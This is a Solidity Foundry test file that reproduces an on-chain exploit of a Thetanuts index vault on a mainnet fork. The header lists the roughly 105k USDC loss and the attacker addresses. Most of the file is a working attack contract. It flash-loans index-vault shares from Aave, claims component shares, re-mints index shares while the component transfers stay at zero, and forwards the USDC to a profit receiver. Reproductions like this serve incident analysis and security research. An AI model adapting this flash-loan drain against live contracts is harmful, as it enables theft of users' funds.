// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 105471.50 USDC
// Attacker : 0x30498e4466789e534c72e03b52a16c978655b41e
// Attack Contract : 0x0f9daa9e0adced4e64578b2e131930dde54e492e
// Vulnerable Contract : 0xc2c3ae0a7b405058558c9b4a63b373486cb86ac7
// Attack Tx : https://etherscan.io/tx/0xbba9f138fe39503bfd1aa62932dbd6ab35d37d23d48e4b7bf2988a9d5dc39fec

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xc2c3ae0a7b405058558c9b4a63b373486cb86ac7

// @Analysis
// Twitter Guy : https://x.com/PeckShieldAlert/status/2066540451126190312
//
// The attacker flash-loaned Thetanuts index-vault shares, claimed component vault shares, then repeatedly minted
// replacement index shares while component transfer amounts stayed at zero. The newly minted shares repaid Aave,
// leaving USDC and residual component-vault shares for the profit receiver.

address constant TX_SENDER = 0x30498e4466789E534c72e03B52A16c978655b41e;
address constant PROFIT_RECEIVER = 0xAf3a0FdBFB0e3127247B66a042310e09C32F2299;
address constant AAVE_POOL = 0x2Ca7641B841a79Cc70220cE838d0b9f8197accDA;
address constant INDEX_VAULT = 0xC2C3AE0a7b405058558C9b4a63b373486CB86Ac7;
address constant AAVE_INDEX_TOKEN = 0x075dA7e9EFEA6813aB0B2680423df75150120d12;
address constant USDC_TOKEN = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant BTC_USD_VAULT = 0x3BA337F3167eA35910E6979D5BC3b0AeE60E7d59;
address constant ETH_USD_VAULT = 0xE1c93dE547cc85CBD568295f6CC322B1dbBCf8Ae;
address constant AVAX_USD_VAULT = 0x248038fDb6F00f4B636812CA6A7F06b81a195AB8;
address constant BNB_USD_VAULT = 0xE5e8caA04C4b9E1C9bd944A2a78a48b05c3ef3AF;
address constant MATIC_USD_VAULT = 0xAD57221ae9897DA08656aaaBd5B1D4673d4eDE71;

interface IThetanutsIndexVault is IERC20 {
    function claim(
        uint256 amount
    ) external;
    function mint(
        uint256 amount
    ) external;
}

interface IThetanutsComponentVault is IERC20 {
    function initWithdraw(
        uint256 shares
    ) external returns (uint256 assets);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 25_323_328;
        vm.createSelectFork("mainnet", forkBlock);
        fundingToken = USDC_TOKEN;

        vm.label(TX_SENDER, "Transaction sender");
        vm.label(PROFIT_RECEIVER, "Profit receiver");
        vm.label(AAVE_POOL, "Aave pool");
        vm.label(AAVE_INDEX_TOKEN, "Aave indexUSDC aToken");
        vm.label(INDEX_VAULT, "Thetanuts index USDC PUT vault");
        vm.label(USDC_TOKEN, "USDC");
        vm.label(BTC_USD_VAULT, "TN BTCUSD component vault");
        vm.label(ETH_USD_VAULT, "TN ETHUSD component vault");
        vm.label(AVAX_USD_VAULT, "TN AVAXUSD component vault");
        vm.label(BNB_USD_VAULT, "TN BNBUSD component vault");
        vm.label(MATIC_USD_VAULT, "TN MATICUSD component vault");
    }

    function testExploit() public balanceLog2(PROFIT_RECEIVER) {
        uint256 usdcBefore = IERC20(USDC_TOKEN).balanceOf(PROFIT_RECEIVER);
        uint256 avaxVaultBefore = IERC20(AVAX_USD_VAULT).balanceOf(PROFIT_RECEIVER);
        uint256 bnbVaultBefore = IERC20(BNB_USD_VAULT).balanceOf(PROFIT_RECEIVER);
        uint256 maticVaultBefore = IERC20(MATIC_USD_VAULT).balanceOf(PROFIT_RECEIVER);

        vm.startPrank(TX_SENDER);
        ThetanutsAttack attack = new ThetanutsAttack(PROFIT_RECEIVER);
        attack.run();
        vm.stopPrank();

        uint256 usdcProfit = IERC20(USDC_TOKEN).balanceOf(PROFIT_RECEIVER) - usdcBefore;
        emit log_named_decimal_uint("Profit receiver USDC profit", usdcProfit, 6);

        assertGt(usdcProfit, 105_000_000_000, "USDC profit below expected impact");
        assertGt(IERC20(AVAX_USD_VAULT).balanceOf(PROFIT_RECEIVER), avaxVaultBefore, "AVAX component not forwarded");
        assertGt(IERC20(BNB_USD_VAULT).balanceOf(PROFIT_RECEIVER), bnbVaultBefore, "BNB component not forwarded");
        assertGt(IERC20(MATIC_USD_VAULT).balanceOf(PROFIT_RECEIVER), maticVaultBefore, "MATIC component not forwarded");
    }
}

contract ThetanutsAttack {
    IThetanutsIndexVault private constant indexVault = IThetanutsIndexVault(INDEX_VAULT);
    IAaveFlashloan private constant aave = IAaveFlashloan(AAVE_POOL);

    address private immutable profitReceiver;

    constructor(
        address profitReceiver_
    ) {
        profitReceiver = profitReceiver_;
    }

    function run() external {
        address[] memory assets = new address[](1);
        assets[0] = INDEX_VAULT;

        uint256[] memory amounts = new uint256[](1);
        uint256 residualIndexShares = 3;
        amounts[0] = indexVault.balanceOf(AAVE_INDEX_TOKEN) - residualIndexShares;

        uint256[] memory modes = new uint256[](1);

        // step 1: borrow the index-vault shares from Aave.
        aave.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);

        // step 4: convert two component vault balances to USDC, then forward all residual value.
        _initWithdraw(BTC_USD_VAULT);
        _initWithdraw(ETH_USD_VAULT);
        _forwardToken(USDC_TOKEN);
        _forwardToken(AVAX_USD_VAULT);
        _forwardToken(BNB_USD_VAULT);
        _forwardToken(MATIC_USD_VAULT);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata
    ) external returns (bool) {
        require(msg.sender == AAVE_POOL, "caller must be Aave");
        require(initiator == address(this), "initiator must be this contract");
        require(assets.length == 1 && assets[0] == INDEX_VAULT, "unexpected flash asset");

        uint256 borrowedShares = amounts[0];
        uint256 repaymentShares = borrowedShares + premiums[0];

        // step 2: claim component-vault shares from the borrowed index-vault shares.
        indexVault.claim(borrowedShares);

        // step 3: remint enough index-vault shares to repay Aave.
        while (indexVault.balanceOf(address(this)) < repaymentShares) {
            uint256 balance = indexVault.balanceOf(address(this));
            uint256 remaining = repaymentShares - balance;
            uint256 nextSupplyBoundary = 1;
            uint256 supplyBoundedMint = indexVault.totalSupply() - nextSupplyBoundary;
            uint256 mintAmount = remaining < supplyBoundedMint ? remaining : supplyBoundedMint;

            indexVault.mint(mintAmount);
        }

        indexVault.approve(AAVE_POOL, repaymentShares);
        return true;
    }

    function _initWithdraw(
        address vault
    ) private {
        uint256 shares = IERC20(vault).balanceOf(address(this));
        require(shares > 0, "no shares to withdraw");
        IThetanutsComponentVault(vault).initWithdraw(shares);
    }

    function _forwardToken(
        address token
    ) private {
        uint256 balance = IERC20(token).balanceOf(address(this));
        require(balance > 0, "no balance to forward");
        IERC20(token).transfer(profitReceiver, balance);
    }
}
